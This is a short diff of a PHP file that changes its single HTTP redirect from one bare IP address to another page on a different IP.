@@ -1,2 +1,2 @@
 <?php
-header('Location: http://167.99.15.57/');
+header('Location: http://67.205.133.40/index.php');
